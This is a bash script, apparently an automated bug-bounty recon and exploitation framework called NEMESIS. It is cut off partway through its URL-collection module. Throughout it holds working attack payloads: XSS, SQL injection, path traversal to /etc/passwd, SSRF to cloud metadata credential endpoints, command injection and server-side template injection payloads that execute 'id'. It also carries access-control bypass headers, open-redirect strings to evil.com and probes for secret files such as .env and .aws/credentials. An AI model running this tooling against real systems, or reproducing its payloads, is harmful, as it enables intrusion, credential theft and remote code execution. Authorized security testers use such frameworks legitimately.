#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════
#   BUG FRAMEWORK v6.1 — "NEMESIS NOISE-ZERO"
#   Auto-Detect → Verify → Dedupe → Auto-Exploit → Prove
#   AUTHORIZED & IN-SCOPE TARGETS ONLY
#   Every finding is independently re-verified + deduplicated before it can
#   be queued, exploited, or reported. Zero noise.
# ═══════════════════════════════════════════════════════════════════════════
set -uo pipefail
IFS=$'\n\t'
shopt -s nullglob extglob

VERSION="6.1"; NAME="NEMESIS"
WS_BASE="${BUG_WS:-$HOME/bug-bounty}"
DOMAIN=""; W=""; EX=""; LOG=""; START=$(date +%s); STEP=0; TOTAL=26
G_FULL=false; EXPLOIT_COUNT=0

T_HTTPX=60; T_NUCLEI=50; R_NUCLEI=150; T_FFUF=120; T_KATANA=50
D_KATANA=3; T_DALFOX=40; TO=10; MAX_SUBS_WB=30; RATE=0
BACKOFF=0; RLAST=0; EXP_SQLI_T=900; EXP_DUMP=false

F_QUICK=false; F_DEEP=false; F_NO_EXPLOIT=false; F_RESUME=false
F_SILENT=false; F_DEBUG=false; F_STRICT=false; F_VERIFY_ONLY=false
F_BANNER=true; F_INSTALL=false; F_UPDNUC=false
F_HEADLESS=false; F_VERIFY_KEYS=false; F_SHELL=false; F_PARALLEL=false
M_SUB=false; M_ONE=false; M_URL=false; M_WE=false; M_JS=false; M_FUZZ=false
M_PORTS=false; M_VULN=false; M_NUC=false; M_XSS=false; M_SQLI=false
M_SSRF=false; M_LFI=false; M_CSRF=false; M_CORS=false; M_IDOR=false
M_OAUTH=false; M_TECH=false; M_WAF=false; M_API=false; M_PMF=false
M_REPORT=false; M_SCOPE=false
SCOPE_FILE=""; COOKIE=""; PROXY=""; CUSTOM_WL=""; COLLECTOR=""
declare -a HDRS=() EXPLOITS=() A=()
declare -A B_TITLE=() B_LEN=() VSEEN=()

R=$'\e[0;31m'; G=$'\e[0;32m'; Y=$'\e[1;33m'; B=$'\e[0;34m'; C=$'\e[0;36m'
M=$'\e[0;35m'; W2=$'\e[1;37m'; D=$'\e[2m'; N=$'\e[0m'
OK="${G}[✔]${N}"; FAIL="${R}[✖]${N}"; WARN="${Y}[!]${N}"; INFO="${C}[*]${N}"; HIT="${R}[💥]${N}"

# ─────────────────────────── LOGGING ───────────────────────────
log() { local lvl=$1; shift; local ts; ts=$(date '+%H:%M:%S'); local msg=""
  case $lvl in
    I)  msg="${INFO} ${D}[${ts}]${N} $*" ;;
    OK) msg="${OK} ${G}[${ts}]${N} $*" ;;
    W)  msg="${WARN} ${Y}[${ts}]${N} ${W2}$*${N}" ;;
    E)  msg="${FAIL} ${R}[${ts}]${N} $*" ;;
    H)  msg="${HIT} ${W2}${R}[${ts}] ▶ $*${N}" ;;
    S)  msg="${M}${W2}▚▚▚ [${ts}] $*${N}" ;;
  esac
  echo "$msg" >> "${LOG:-/tmp/bug.log}"
  [[ "$F_SILENT" == true && "$lvl" != "H" ]] && return
  [[ "$F_DEBUG" == false && "$lvl" == "I" ]] && return
  echo -e "$msg"
}
step() { STEP=$((STEP+1)); local pct=$((STEP*100/TOTAL)) bar=""
  for ((i=0;i<pct/4;i++)); do bar+="█"; done; for ((i=pct/4;i<25;i++)); do bar+="░"; done
  log S "▸ [${bar}] ${pct}% — $1"
}

# ─────────────────────────── CORE HELPERS ───────────────────────────
has() { command -v "$1" &>/dev/null; }
cnt() { wc -l < "${1:-/dev/null}" 2>/dev/null | tr -d ' '; }
sn()  { echo "$1" | md5sum | cut -c1-12; }
u()   { local f; for f in "$@"; do [[ -f "$f" ]] && sort -u -o "$f" "$f" 2>/dev/null || true; done; }
qcount() { local c=0 e; for e in "${EXPLOITS[@]:-}"; do [[ "$e" == "$1"$'\t'* ]] && c=$((c+1)); done; echo "$c"; }
UA_ARR=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148")
ua() { echo "${UA_ARR[$((RANDOM % ${#UA_ARR[@]}))]}"; }
throttle() { [[ "$RATE" -le 0 ]] && return
  local now gap wait; now=$(date +%s%N); gap=$((1000000000 / RATE))
  wait=$(( gap - (now - RLAST) ))
  [[ $wait -gt 0 ]] && sleep "$(awk "BEGIN{printf \"%.3f\", $wait/1000000000}")"
  RLAST=$(date +%s%N)
  [[ "$BACKOFF" -gt 0 ]] && { sleep "$BACKOFF"; BACKOFF=$((BACKOFF > 30 ? 0 : BACKOFF - 1)); }
}
mkhdr() { A=(); [[ -n "$COOKIE" ]] && A+=(-b "$COOKIE"); [[ -n "$PROXY" ]] && A+=(-x "$PROXY")
  for h in "${HDRS[@]+"${HDRS[@]}"}"; do [[ -n "$h" ]] && A+=(-H "$h"); done; }
curlx() { throttle; mkhdr; curl -s --max-time "$TO" --connect-timeout 5 -A "$(ua)" "${A[@]+"${A[@]}"}" "$@"; }
RC=""; RB=""; RL=0
probe() { local fol="" u=""; [[ "$1" == "-L" ]] && { fol="-L"; u="$2"; } || u="$1"
  local tmp; tmp=$(mktemp)
  RC=$(curlx $fol -o "$tmp" -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
  [[ "$RC" == "429" || "$RC" == "503" ]] && BACKOFF=$((BACKOFF + 2))
  RB=$(head -c 4000 "$tmp" 2>/dev/null || true); RL=$(wc -c < "$tmp" 2>/dev/null || echo 0)
  rm -f "$tmp"
}
setparam() { local u=$1 n=$2 v=$3
  if [[ "$u" =~ ([?&])${n}=[^&]* ]]; then echo "${u/${BASH_REMATCH[0]}/${BASH_REMATCH[1]}${n}=${v}}"
  else echo "${u}&${n}=${v}"; fi
}

# ─────────────────────────── NOISE-ZERO ENGINE ───────────────────────────
norm() { local u=$1
  u=$(echo "$u" | sed -E 's/#.*//; s/[?&]$//; s|/+$||')
  u=$(echo "$u" | sed -E 's/([?&])(utm_[a-z]+|fbclid|gclid|ref|source|mc_cid|mc_eid)=[^&]*&?/\1/g; s/[?&]$//')
  echo "$u"
}
fhash() { echo -n "$1|$2" | md5sum | cut -c1-16; }
calibrate() { local u=$1 b resp
  b=$(echo "$u" | grep -oP 'https?://[^/]+') || return
  resp=$(curlx -- "${b}/__nemesis_probe_$RANDOM$RANDOM" 2>/dev/null)
  B_TITLE["$b"]=$(echo "$resp" | grep -oiP '<title>[^<]*' | head -1 | cut -d'>' -f2- | tr '[:upper:]' '[:lower:]')
  B_LEN["$b"]=${#resp}
}
soft404() { local u=$1 body=$2 b bt bl cl d
  b=$(echo "$u" | grep -oP 'https?://[^/]+') || return 1
  bt=$(echo "$body" | grep -oiP '<title>[^<]*' | head -1 | cut -d'>' -f2- | tr '[:upper:]' '[:lower:]')
  [[ -n "${B_TITLE[$b]:-}" && "$bt" == "${B_TITLE[$b]}" ]] && return 0
  bl=${B_LEN[$b]:-0}; cl=${#body}
  if [[ $bl -gt 0 ]]; then d=$((cl - bl)); [[ $d -lt 0 ]] && d=$((-d)); [[ $d -lt 40 ]] && return 0; fi
  return 1
}
verify() { local cls=$1 url=$2 payload=$3 key rb t0 t1 d1 d2 f tu
  url=$(norm "$url"); key=$(fhash "$cls" "$url")
  [[ -n "${VSEEN[$key]:-}" ]] && return 1
  case "$cls" in
    xss)      rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
              soft404 "$url" "$rb" && return 1
              echo "$rb" | grep -qiE "alert\(1\)|alert\(document\.domain\)|onerror=alert|srcdoc=" || return 1 ;;
    sqli)     has qsreplace || return 1
              tu=$(echo "$url" | qsreplace "' AND SLEEP(4)--" 2>/dev/null)
              t0=$(date +%s%N); curlx -o /dev/null -- "$tu" 2>/dev/null; t1=$(date +%s%N)
              (( (t1-t0)/1000000 < 3000 )) && return 1 ;;
    lfi)      rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
              { echo "$rb" | grep -qE '^root:[x*]:' || \
                { echo "$rb" | tr -d '\n' | base64 -d 2>/dev/null | grep -qE '^root:[x*]:'; }; } || return 1 ;;
    ssrf)     rb=$(curlx -L -- "$url" 2>/dev/null | head -c 4000)
              echo "$rb" | grep -qE 'ami-id|computeMetadata|arn:aws|meta-data|user-data' || return 1 ;;
    cmdi)     t0=$(date +%s%N); curlx -o /dev/null -- "$url" 2>/dev/null; t1=$(date +%s%N); d1=$(( (t1-t0)/1000000 ))
              t0=$(date +%s%N); curlx -o /dev/null -- "$url" 2>/dev/null; t1=$(date +%s%N); d2=$(( (t1-t0)/1000000 ))
              { [[ $d1 -lt 3000 || $d2 -lt 3000 ]] && return 1; } ;;
    ssti)     rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
              echo "$rb" | grep -qP '(^|[^0-9])49([^0-9]|$)' || { echo "$rb" | grep -q "7777777" || return 1; } ;;
    csrf)     rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
              echo "$rb" | grep -qiE '<form[^>]+method=["'"'"']?post' || return 1
              echo "$rb" | grep -qiE '(csrf|_token|authenticity_token|nonce|__requestverificationtoken)' && return 1 ;;
    cors)     rb=$(curlx -H "Origin: $payload" -I -- "$url" 2>/dev/null)
              { echo "$rb" | grep -qi 'access-control-allow-credentials: *true' || \
                echo "$rb" | grep -qi "access-control-allow-origin: *\*"; } || return 1 ;;
    redirect) f=$(curlx -o /dev/null -w '%{url_effective}' -- "$url" 2>/dev/null)
              echo "$f" | grep -qiE '^(https?://)?(www\.)?evil\.com' || return 1 ;;
    oauth)    f=$(curlx -o /dev/null -w '%{url_effective}' -- "$url" 2>/dev/null)
              echo "$f" | grep -qiE '^https?://[^/]*evil\.com' || return 1 ;;
    bac)      rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
              soft404 "$url" "$rb" && return 1
              echo "$rb" | grep -qiE '(login|sign ?in|redirecting|forbidden)' && return 1 ;;
    idor)     rb=$(curlx -- "$url" 2>/dev/null | head -c 4000)
              soft404 "$url" "$rb" && return 1
              echo "$rb" | grep -qiE '(login|sign ?in)' && return 1
              echo "$rb" | grep -qiE '(\{|"id"|"name"|"data"|</)' || return 1 ;;
    jwt)      echo "$url" | cut -d. -f1 | base64 -d 2>/dev/null | grep -qi '"alg"[^,]*"none"' || return 1 ;;
    takeover) rb=$(curlx -- "$url" 2>/dev/null | head -c 1200)
              echo "$rb" | grep -qiE 'heroku|github.*not found|azurewebsites|netlify.*not found|no such bucket' || return 1 ;;
    *) ;;
  esac
  VSEEN["$key"]=1
  echo "$url"
}
queue() { EXPLOITS+=("$1"$'\t'"$2"$'\t'"$3"$'\t'"$4"); }
qverify() { local cls=$1 url=$2 payload=$3 sev=$4 ok
  ok=$(verify "$cls" "$url" "$payload" 2>/dev/null) || return
  [[ -z "$ok" ]] && return
  queue "$cls" "$ok" "$payload" "$sev"
  log H "[VERIFIED] $cls: $ok"
}

# ─────────────────────────── PAYLOAD PACKS ───────────────────────────
XSS_P=('<script>alert(document.domain)</script>' '<img src=x onerror=alert(1)>' '<svg/onload=alert(1)>'
       '"><svg/onload=alert(1)>' "'-alert(1)-'" '<iframe srcdoc="<script>alert(1)</script>">')
SQLI_DET=("' OR 1=1--" "' OR '1'='1" "') OR ('1'='1" '" OR 1=1--' "1;SELECT SLEEP(2)--" "' AND SLEEP(2)--")
LFI_P=('../../../../etc/passwd' '..%2F..%2F..%2F..%2Fetc%2Fpasswd' '....//....//....//etc/passwd'
       '%2e%2e%2f%2e%2e%2fetc%2fpasswd' '/etc/passwd%00' '..%252f..%252f..%252fetc%252fpasswd'
       'php://filter/read=convert.base64-encode/resource=/etc/passwd' '/proc/self/environ'
       '/var/log/apache2/access.log' '/var/log/nginx/access.log' '/etc/hostname')
SSRF_P=('http://169.254.169.254/latest/meta-data/' 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
        'http://metadata.google.internal/computeMetadata/v1/?recursive=true' 'http://100.100.100.200/latest/meta-data/'
        'http://127.0.0.1' 'http://0x7f000001' 'http://2130706433' 'http://[::1]'
        'dict://127.0.0.1:11211/stats' 'gopher://127.0.0.1:6379/_INFO' 'file:///etc/passwd')
CMDI_DET=(';sleep 3' '|sleep 3' '`sleep 3`' '$(sleep 3)' '& sleep 3' ';ping -c 3 127.0.0.1')
SSTI_PROBES=('{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '*{7*7}' '{{7*'"'"'7'"'"'}}')
SSTI_RCE=('Jinja2|{{cycler.__init__.__globals__.os.popen("id").read()}}'
          'Twig|{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
          'Freemarker|<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
          'Velocity|#set($e="x")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")'
          'ERB|<%= system("id") %>' 'Pebble|{{type.getInstance().exec("id")}}')
REDIRECT_P=('https://evil.com' '//evil.com' 'https://evil.com/%2f..' 'https://evil.com%2f..' '/\evil.com' 'https:evil.com')
HDR_BYPASS=('X-Original-URL: %P%' 'X-Rewrite-URL: %P%' 'X-Override-URL: %P%' 'X-Forwarded-For: 127.0.0.1'
            'X-Real-IP: 127.0.0.1' 'X-Custom-IP-Authorization: 127.0.0.1' 'CF-Connecting-IP: 127.0.0.1'
            'X-Host: localhost' 'X-Forwarded-Host: localhost')
PATH_TRICKS=('%2e' '/' '//' '/.' '/..' '/%2f' '%20' '%09' '/.' '..;/' '?x' '/./' '%3f' '#' '/%2e')
META_FILES=('/.env' '/.env.local' '/.env.production' '/.git/config' '/.git/HEAD' '/.git/COMMIT_EDITMSG'
  '/config.php' '/config.yml' '/config.json' '/wp-config.php' '/wp-config.php.bak' '/database.yml'
  '/docker-compose.yml' '/Dockerfile' '/package.json' '/phpinfo.php' '/server-status' '/.htpasswd'
  '/actuator' '/actuator/env' '/actuator/heapdump' '/actuator/mappings' '/metrics' '/swagger.json'
  '/api-docs' '/openapi.json' '/swagger-ui.html' '/.DS_Store' '/backup.sql' '/dump.sql' '/robots.txt'
  '/.well-known/security.txt' '/.aws/credentials' '/web.config' '/crossdomain.xml')
API_PATHS=('/swagger.json' '/swagger-ui.html' '/api-docs' '/api-docs.json' '/api/swagger.json'
  '/openapi.json' '/openapi.yaml' '/v1/api-docs' '/v2/api-docs' '/v3/api-docs' '/redoc' '/.well-known/openapi')
GQL_PATHS=('/graphql' '/api/graphql' '/graphiql' '/v1/graphql' '/gql' '/query' '/api/query')
TECH_PATHS=('wordpress|/wp-json/wp/v2/users' 'wordpress|/wp-login.php' 'wordpress|/xmlrpc.php'
  'laravel|/telescope/requests' 'laravel|/_ignition/share-report' 'laravel|/_debugbar'
  'spring|/actuator/env' 'spring|/actuator/heapdump' 'drupal|/CHANGELOG.txt' 'drupal|/update.php')
WAF_ENC=("" "%3Cscript%3Ealert(1)%3C/script%3E" "<scr%00ipt>alert(1)</scr%00ipt>" "<scrİpt>alert(1)</scrİpt>"
         "%u003cscript%u003ealert(1)" "<script>alert/**/(1)</script>" "<scr\tipt>alert(1)</scr\tipt>" "<svg onload=alert&lpar;1&rpar;>")

# ─────────────────────────── EMBEDDED PYTHON HELPERS ───────────────────────────
make_helpers() {
  mkdir -p "$W/tools"
  cat > "$W/tools/js_dl.py" <<'PYDL'
import sys,os,hashlib,concurrent.futures as cf,urllib.request
def dl(u,d):
    try:
        p=os.path.join(d,hashlib.sha1(u.encode()).hexdigest()[:16]+".js")
        if os.path.exists(p): return u,"skip"
        req=urllib.request.Request(u,headers={"User-Agent":"Mozilla/5.0"})
        b=urllib.request.urlopen(req,timeout=15).read(2_000_000)
        if b: open(p,"wb").write(b); return u,len(b)
    except Exception as e: return u,str(e)[:50]
    return u,"empty"
d,src=sys.argv[1],sys.argv[2]
urls=[l.strip() for l in open(src) if l.strip()]
with cf.ThreadPoolExecutor(max_workers=25) as ex:
    for u,r in ex.map(lambda u:dl(u,d),urls): print(f"{r}\t{u}")
PYDL
  cat > "$W/tools/active.py" <<'PYAC'
import sys,concurrent.futures as cf,urllib.request,urllib.error
KEEP=(200,201,204,301,302,307,401,403,405,500)
def chk(u):
    try:
        try: r=urllib.request.urlopen(urllib.request.Request(u,method="HEAD",headers={"User-Agent":"Mozilla/5.0"}),timeout=8)
        except urllib.error.HTTPError as e: r=e
        return u if getattr(r,"status",getattr(r,"code",0)) in KEEP else None
    except Exception: return None
urls=[l.strip() for l in sys.stdin if l.strip()]
lim=int(sys.argv[1]) if len(sys.argv)>1 else 50
with cf.ThreadPoolExecutor(max_workers=40) as ex:
    for u in ex.map(chk,urls[:lim*6]):
        if u: print(u)
PYAC
  cat > "$W/tools/form_scrape.py" <<'PYFS'
import sys,re,urllib.request,urllib.parse,concurrent.futures as cf
def scrape(u):
    try:
        h=urllib.request.urlopen(urllib.request.Request(u,headers={"User-Agent":"Mozilla/5.0"}),timeout=10).read().decode("utf-8","ignore")
        out=[]
        for fm in re.finditer(r"<form[^>]*>(.*?)</form>",h,re.S|re.I):
            tag=fm.group(0)
            m=re.search(r'method=["\']?(\w+)',tag,re.I); method=m.group(1).upper() if m else "GET"
            a=re.search(r'action=["\']([^"\']+)',tag,re.I)
            action=urllib.parse.urljoin(u,a.group(1)) if a else u
            ins=[]
            for el in re.finditer(r"<(?:input|select|textarea)[^>]*>",fm.group(1),re.I):
                s=el.group(0); nm=re.search(r'name=["\']([^"\']+)',s,re.I)
                if not nm: continue
                val=re.search(r'value=["\']([^"\']*)',s,re.I)
                ins.append(f"{nm.group(1)}={val.group(1) if val else ''}")
            if ins: out.append(f"{action}\t{method}\t{','.join(ins)}")
        return out
    except Exception: return []
urls=[l.strip() for l in sys.stdin if l.strip()]
with cf.ThreadPoolExecutor(max_workers=20) as ex:
    for res in ex.map(scrape,urls):
        for r in res: print(r)
PYFS
  cat > "$W/tools/js_paths.py" <<'PYP'
# JS -> PATHS ONLY (scheme/host stripped, assets dropped, deduped in-set)
import sys,os,re,urllib.parse
d=sys.argv[1]; paths=set()
for f in os.listdir(d):
    if not f.endswith(".js"): continue
    try: s=open(os.path.join(d,f),encoding="utf-8",errors="ignore").read()
    except: continue
    for m in re.finditer(r'''['"`]((?:https?:)?//[^'"`\s]+|/[^'"`\s]*|(?:\.{1,2}/)?[a-zA-Z0-9_./-]{3,}(?:\?[^'"`\s]*)?)['"`]''',s):
        v=m.group(1)
        if v.startswith("//") or v.startswith("http"):
            v=urllib.parse.urlsplit(v if "//" in v else "https:"+v).path
        else:
            v=urllib.parse.urlsplit(v).path or v
        if not v.startswith("/"): v="/"+v.lstrip("./")
        if len(v)>1 and not re.search(r'\.(png|jpe?g|gif|css|woff2?|ttf|eot|svg|ico|mp4|mp3|zip|gz|map)$',v,re.I):
            paths.add(v)
for p in sorted(paths): print(p)
PYP
  chmod +x "$W/tools/"*.py
}

# ─────────────────────────── WORKSPACE / RESUME ───────────────────────────
setup_ws() {
  W="$WS_BASE/$DOMAIN"; EX="$W/exploits"
  mkdir -p "$W"/{subs,urls/gf,js/dl,js/paths,paths,params,endpoints,vulns,\
classified/{idor,bac,oauth},exploits/{sqli,ssrf,lfi,cmdi,ssti,xss,idor,bac,oauth,jwt,csrf,cors,redirect,takeover},reports,logs}
  LOG="$W/logs/master.log"; touch "$LOG"
  make_helpers
  echo "TARGET=$DOMAIN VERSION=$VERSION AUTH=$([ -n "$COOKIE" ] && echo YES || echo NO) PROXY=${PROXY:-NONE}" > "$W/scan_config.txt"
  log I "Workspace: $W"
}
mark()   { echo "$1" >> "$W/.done" 2>/dev/null || true; }
is_done(){ [[ "$F_RESUME" == true ]] && grep -qx "$1" "$W/.done" 2>/dev/null; }
run_mod(){ local name=$1 fn=$2; shift 2
  if is_done "$name"; then log I "SKIP $name (resumed)"; return; fi
  "$fn" "$@" || log W "module $name exited non-zero"
  mark "$name"; }
ensure_live() {
  [[ -s "$W/subs/live.txt" ]] && return
  log I "quick probe (no recon data)…"
  { echo "https://$DOMAIN"; subfinder -d "$DOMAIN" -silent 2>/dev/null \
    | httpx -silent -threads "$T_HTTPX" -timeout "$TO"; } | sort -u > "$W/subs/live.txt"
  cp "$W/subs/live.txt" "$W/subs/status_200.txt" 2>/dev/null || true
  touch "$W/subs/status_403.txt" "$W/subs/tech.txt"
  while IFS= read -r u; do calibrate "$u"; done < <(head -10 "$W/subs/live.txt" 2>/dev/null || true)
}
ensure_urls() {
  [[ -s "$W/urls/all.txt" ]] && return
  ensure_live
  { echo "$DOMAIN" | timeout 60 waybackurls 2>/dev/null
    echo "$DOMAIN" | timeout 60 gau --threads 5 2>/dev/null
  } | sort -u > "$W/urls/all.txt"
  grep -E '\?[a-zA-Z0-9_%-]+=' "$W/urls/all.txt" | sort -u > "$W/urls/params.txt"
  for p in xss sqli ssrf redirect lfi rce idor interestingparams; do
    gf "$p" "$W/urls/all.txt" 2>/dev/null | sort -u > "$W/urls/gf/$p.txt"
  done
  grep -oP '[?&][a-zA-Z0-9_%-]+=' "$W/urls/params.txt" | sed 's/^[?&]//;s/=//' | sort -u > "$W/params/all.txt"
}

# ─────────────────────────── INSTALL ───────────────────────────
install() {
  log I "Installing tools…"
  export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin" GOPATH="$HOME/go"
  sudo apt-get update -qq 2>/dev/null || true
  for p in python3 python3-pip curl wget git jq nmap sqlmap; do has "$p" || sudo apt-get install -y -qq "$p" 2>/dev/null; done
  has go || { wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz -O /tmp/go.tgz \
    && sudo tar -C /usr/local -xzf /tmp/go.tgz \
    && echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc \
    && export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin"; }
  local PKGS=(subfinder httpx nuclei katana dnsx alterx naabu waybackurls gf anew qsreplace gau dalfox hakrawler ffuf getJS assetfinder gowitness)
  for p in "${PKGS[@]}"; do
    has "$p" || { go install "github.com/projectdiscovery/${p}/cmd/${p}@latest" 2>/dev/null \
      || go install "github.com/tomnomnom/${p}@latest" 2>/dev/null \
      || go install "github.com/hahwul/${p}/v2@latest" 2>/dev/null \
      || go install "github.com/lc/${p}/v2/cmd/${p}@latest" 2>/dev/null \
      || go install "github.com/ffuf/${p}/v2@latest" 2>/dev/null \
      || go install "github.com/003random/${p}@latest" 2>/dev/null \
      || log W "$p install failed"; }
  done
  pip3 install -q waymore uro arjun dirsearch wafw00f --break-system-packages 2>/dev/null || true
  [[ -d "$HOME/tools/SecretFinder" ]] || { git clone -q https://github.com/m4ll0k/SecretFinder.git "$HOME/tools/SecretFinder" 2>/dev/null && pip3 install -qr "$HOME/tools/SecretFinder/requirements.txt" --break-system-packages 2>/dev/null; }
  [[ -d "$HOME/tools/jwt_tool" ]] || { git clone -q https://github.com/ticarpi/jwt_tool.git "$HOME/tools/jwt_tool" 2>/dev/null && pip3 install -qr "$HOME/tools/jwt_tool/requirements.txt" --break-system-packages 2>/dev/null; }
  [[ -d "$HOME/tools/LinkFinder" ]] || { git clone -q https://github.com/GerbenJavado/LinkFinder.git "$HOME/tools/LinkFinder" 2>/dev/null; }
  [[ -d "$HOME/.gf" ]] || { mkdir -p ~/.gf; git clone -q --depth 1 https://github.com/1ndianl33t/Gf-Patterns.git /tmp/gfp 2>/dev/null && cp /tmp/gfp/*.json ~/.gf/ 2>/dev/null; git clone -q https://github.com/tomnomnom/gf.git /tmp/gfs 2>/dev/null && cp /tmp/gfs/examples/*.json ~/.gf/ 2>/dev/null; }
  [[ -d "$HOME/nuclei-templates" ]] || nuclei -update-templates 2>/dev/null
  [[ -f /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt ]] \
    || sudo apt-get install -y -qq seclists 2>/dev/null \
    || git clone -q --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists 2>/dev/null
  log OK "Install complete"
}

# ─────────────────────────── MOD 01 — RECON ───────────────────────────
mod_recon() {
  step "01 RECON — subs · resolve · probe · calibrate · ports"
  local O="$W/subs"
  if [[ "$M_ONE" == true ]]; then
    echo "https://$DOMAIN" > "$O/live.txt"; echo "https://$DOMAIN" > "$O/status_200.txt"
    echo "$DOMAIN" > "$O/all.txt"; touch "$O/status_403.txt" "$O/tech.txt"
    while IFS= read -r u; do calibrate "$u"; done < <(head -10 "$O/live.txt"); return
  fi
  has subfinder && { log I "subfinder…"; subfinder -d "$DOMAIN" -silent -all -recursive -o "$O/subfinder.txt" 2>/dev/null || true; }
  log I "crt.sh…"; curlx -- "https://crt.sh/?q=%25.${DOMAIN}&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' > "$O/crtsh.txt" || true
  has assetfinder && { log I "assetfinder…"; assetfinder --subs-only "$DOMAIN" 2>/dev/null > "$O/assetfinder.txt" || true; }
  log I "urlscan · rapiddns · hackertarget…"
  curlx -- "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" | jq -r '.results[]?.page?.domain' 2>/dev/null | grep -F ".$DOMAIN" >> "$O/urlscan.txt" 2>/dev/null || true
  curlx -- "https://rapiddns.io/subdomain/$DOMAIN?full=1" | grep -oE "[a-zA-Z0-9._-]+\.${DOMAIN}" >> "$O/rapiddns.txt" 2>/dev/null || true
  curlx -- "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" | cut -d',' -f1 >> "$O/hackertarget.txt" 2>/dev/null || true
  if [[ "$F_QUICK" == false ]]; then
    has amass && { log I "amass passive (120s cap)…"; timeout 120 amass enum -passive -d "$DOMAIN" -o "$O/amass.txt" -silent 2>/dev/null || true; }
    has alterx && { log I "alterx permutations…"; cat "$O/subfinder.txt" 2>/dev/null | alterx -silent 2>/dev/null | head -5000 >> "$O/alterx.txt" 2>/dev/null || true; }
  fi
  cat "$O"/*.txt 2>/dev/null | sort -u | grep -E "^[a-zA-Z0-9]([a-zA-Z0-9._-]*)\.${DOMAIN}$" > "$O/all.txt"
  log OK "Subdomains (unique): $(cnt "$O/all.txt")"
  has dnsx && { log I "dnsx resolve…"; cat "$O/all.txt" | dnsx -silent -a -cname -resp -o "$O/resolved.txt" 2>/dev/null || true
    awk '{print $1}' "$O/resolved.txt" > "$O/resolved_hosts.txt" 2>/dev/null || true; }
  if grep -qiE "(github\.io|heroku|amazonaws|cloudfront|azurewebsites|netlify|surge\.sh|bitbucket\.io|fastly)" "$O/resolved.txt" 2>/dev/null; then
    grep -iE "(github\.io|heroku|amazonaws|cloudfront|azurewebsites|netlify|surge\.sh|bitbucket\.io|fastly)" "$O/resolved.txt" > "$O/takeover_cands.txt"
    log W "takeover candidates: $(cnt "$O/takeover_cands.txt")"
  fi
  has httpx && { log I "httpx fingerprint…"
    { cat "$O/resolved_hosts.txt" "$O/all.txt" 2>/dev/null; echo "$DOMAIN"; } | sort -u \
      | httpx -silent -status-code -title -tech-detect -content-length -web-server -ip -cdn \
        -ports 80,443,8080,8443,8888,8000,3000,5000,9000 \
        -threads "$T_HTTPX" -timeout "$TO" -follow-redirects \
        ${COOKIE:+-H "Cookie: $COOKIE"} ${PROXY:+-http-proxy "$PROXY"} \
        -json -o "$O/hosts.json" 2>/dev/null || true
    jq -r '.url' "$O/hosts.json" 2>/dev/null | sort -u > "$O/live.txt"
    for c in 200 301 302 401 403 404 500; do jq -r "select(.status_code==$c)|.url" "$O/hosts.json" 2>/dev/null | sort -u > "$O/status_$c.txt"; done
    cp "$O/status_403.txt" "$W/paths/403_targets.txt" 2>/dev/null || true
    jq -r '.tech[]?' "$O/hosts.json" 2>/dev/null | sort | uniq -c | sort -rn | head -40 > "$O/tech.txt"
    log OK "Live (unique): $(cnt "$O/live.txt") | 200: $(cnt "$O/status_200.txt") | 403: $(cnt "$O/status_403.txt")"; }
  while IFS= read -r u; do calibrate "$u"; done < <(head -10 "$O/live.txt" 2>/dev/null || true)
  [[ "$F_QUICK" == false && "$F_DEEP" == true && -s "$O/resolved_hosts.txt" ]] && {
    has naabu && { log I "naabu port scan…"; cat "$O/resolved_hosts.txt" | naabu -silent -top-ports 1000 -rate 1000 -o "$O/ports.txt" 2>/dev/null || true
      log OK "Open ports: $(cnt "$O/ports.txt")"; }
    has nmap && { log I "nmap top-1000…"; nmap -iL "$O/resolved_hosts.txt" --top-ports 1000 -T4 --open -sV --version-intensity 3 -oN "$O/nmap.txt" 2>/dev/null || true; }
  }
}

# ─────────────────────────── MOD 02 — URL COLLECTION ───────────────────────────
mod_urls() {
  step "02 URL COLLECTION (all sources, deduped)"
  local O="$W/urls"
  has waybackurls && { log I "waybackurls…"
    timeout 120 bash -c "echo '$DOMAIN' | waybackurls 2>/dev/null" > "$O/wayback.txt" || true
    head -"$MAX_SUBS_WB" "$W/subs/resolved_hosts.txt" 2>/dev/null | while IFS= read -r s; do
      timeout 25 bash -c "echo '$s' | waybackurls 2>/dev/null" 2>/dev/null || true
    done >> "$O/wayback.txt" || true; }
  has gau && { log I "gau…"; timeout 180 gau --subs --threads 10 --timeout 10 --blacklist "png,jpg,gif,ico,svg,woff,woff2,ttf,eot,css,mp4,zip" "$DOMAIN" 2>/dev/null > "$O/gau.txt" || true; }
  has waymore && { log I "waymore…"; timeout 180 waymore -i "$DOMAIN" -mode U -oU "$O/waymore.txt" --timeout 30 2>/dev/null || true; }
  curlx -- "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" | jq -r '.results[]?.page?.url' 2>/dev/null > "$O/urlscan.txt" || true
  has katana && { log I "katana crawl (depth $D_KATANA)…"
